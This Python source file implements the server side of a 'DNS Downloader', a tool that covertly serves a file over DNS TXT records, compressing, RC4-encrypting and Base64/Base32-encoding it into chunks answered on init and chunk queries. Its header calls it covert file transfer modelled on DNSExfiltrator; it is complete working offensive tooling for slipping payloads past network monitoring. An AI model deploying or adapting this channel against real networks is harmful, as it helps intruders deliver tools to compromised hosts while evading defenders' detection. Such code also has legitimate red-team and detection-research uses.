#!/usr/bin/env python3
# -*- coding: utf8 -*-
"""
DNS Downloader - Server Side
Serves files over DNS TXT records for covert file transfer.
Based on DNSExfiltrator concept but reversed direction.

Author: Security Research
"""

import argparse
import socket
import os
import sys
from dnslib import *
from base64 import b64encode, b32encode
from io import BytesIO
import zipfile

#======================================================================================================
#                                       HELPERS FUNCTIONS
#======================================================================================================

class RC4:
    """RC4 encryption/decryption"""
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    def encrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)


def color(string, color=None):
    """Colorize terminal output"""
    attr = ['1']
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
        elif string.strip().startswith("[+]"):
            attr.append('32')
        elif string.strip().startswith("[*]"):
            attr.append('34')
        elif string.strip().startswith("[?]"):
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


def toBase64URL(data):
    """Convert bytes to Base64URL encoding (DNS-safe)"""
    encoded = b64encode(data).decode('utf-8')
    return encoded.replace('+', '-').replace('/', '_').rstrip('=')


def toBase32Str(data):
    """Convert bytes to Base32 encoding (case-insensitive, DNS-safe)"""
    encoded = b32encode(data).decode('utf-8')
    return encoded.rstrip('=').lower()


def prepare_file(filepath, password, use_base32=False, chunk_size=200):
    """
    Prepare file for DNS transfer:
    1. Compress (ZIP)
    2. Encrypt (RC4)
    3. Encode (Base64URL or Base32)
    4. Chunk
    """
    filename = os.path.basename(filepath)
    
    # Read file
    with open(filepath, 'rb') as f:
        file_data = f.read()
    
    print(color(f"[*] Original file size: {len(file_data)} bytes"))
    
    # Compress (ZIP in memory)
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, file_data)
    zip_data = zip_buffer.getvalue()
    
    print(color(f"[*] Compressed size: {len(zip_data)} bytes"))
    
    # Encrypt (RC4)
    rc4 = RC4(password)
    encrypted_data = rc4.encrypt(bytearray(zip_data))
    
    print(color(f"[*] Encrypted size: {len(encrypted_data)} bytes"))
    
    # Encode
    if use_base32:
        encoded_data = toBase32Str(bytes(encrypted_data))
        encoding = "base32"
    else:
        encoded_data = toBase64URL(bytes(encrypted_data))
        encoding = "base64url"
    
    print(color(f"[*] Encoded size ({encoding}): {len(encoded_data)} bytes"))
    
    # Chunk
    chunks = []
    for i in range(0, len(encoded_data), chunk_size):
        chunks.append(encoded_data[i:i + chunk_size])
    
    print(color(f"[+] File prepared: {len(chunks)} chunks of ~{chunk_size} bytes"))
    
    return {
        'filename': filename,
        'chunks': chunks,
        'total_chunks': len(chunks),
        'encoding': encoding,
        'original_size': len(file_data),
        'checksum': sum(file_data) & 0xFFFFFFFF  # Simple checksum
    }


#======================================================================================================
#                                           MAIN
#======================================================================================================

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Downloader Server - Serve files over DNS')
    parser.add_argument("-d", "--domain", help="Domain name for DNS requests", dest="domain", required=True)
    parser.add_argument("-f", "--file", help="File to serve", dest="filepath", required=True)
    parser.add_argument("-p", "--password", help="Password for encryption", dest="password", required=True)
    parser.add_argument("-b32", "--base32", help="Use Base32 encoding", dest="use_base32", action="store_true")
    parser.add_argument("-c", "--chunk-size", help="Chunk size (default: 200)", dest="chunk_size", type=int, default=200)
    parser.add_argument("-P", "--port", help="DNS server port (default: 53)", dest="port", type=int, default=53)
    args = parser.parse_args()

    # Verify file exists
    if not os.path.exists(args.filepath):
        print(color(f"[!] File not found: {args.filepath}"))
        sys.exit(1)

    # Prepare file
    print(color(f"[*] Preparing file: {args.filepath}"))
    file_info = prepare_file(args.filepath, args.password, args.use_base32, args.chunk_size)

    # Setup UDP DNS server
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', args.port))
    print(color(f"[+] DNS server listening on port {args.port}"))
    print(color(f"[*] Domain: {args.domain}"))
    print(color(f"[*] Serving file: {file_info['filename']} ({file_info['total_chunks']} chunks)"))
    print(color("[*] Waiting for download requests...\n"))

    try:
        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)
            qname = str(request.q.qname).lower().rstrip('.')
            qtype = request.q.qtype
            
            print(color(f"[DEBUG] Received query: {qname} (type: {qtype}) from {addr[0]}"))
            
            # Only handle TXT queries
            if qtype != QTYPE.TXT:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)
                continue

            # Remove domain suffix
            domain_suffix = "." + args.domain.lower()
            if not qname.endswith(domain_suffix) and qname != args.domain.lower():
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)
                continue

            query_part = qname[:-len(domain_suffix)] if qname.endswith(domain_suffix) else qname

            # Handle INIT request: init.<domain>
            if query_part == "init":
                # Return metadata: filename|total_chunks|encoding|checksum
                metadata = f"{file_info['filename']}|{file_info['total_chunks']}|{file_info['encoding']}|{file_info['checksum']}"
                print(color(f"[+] INIT request from {addr[0]} - Sending metadata"))
                
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(metadata), ttl=0))
                udps.sendto(reply.pack(), addr)

            # Handle CHUNK request: chunk-<N>.<nonce>.<domain>
            elif query_part.startswith("chunk-"):
                parts = query_part.split('.')
                try:
                    chunk_num = int(parts[0].replace("chunk-", ""))
                    
                    if 0 <= chunk_num < file_info['total_chunks']:
                        chunk_data = file_info['chunks'][chunk_num]
                        print(color(f"[*] CHUNK {chunk_num}/{file_info['total_chunks']-1} requested from {addr[0]}"))
                        
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunk_data), ttl=0))
                        udps.sendto(reply.pack(), addr)
                    else:
                        print(color(f"[!] Invalid chunk number: {chunk_num}"))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ERROR"), ttl=0))
                        udps.sendto(reply.pack(), addr)
                        
                except (ValueError, IndexError) as e:
                    print(color(f"[!] Invalid chunk request: {query_part}"))
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    udps.sendto(reply.pack(), addr)

            else:
                # Unknown query
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)

    except KeyboardInterrupt:
        print(color("\n[!] Server stopped"))
    finally:
        udps.close()

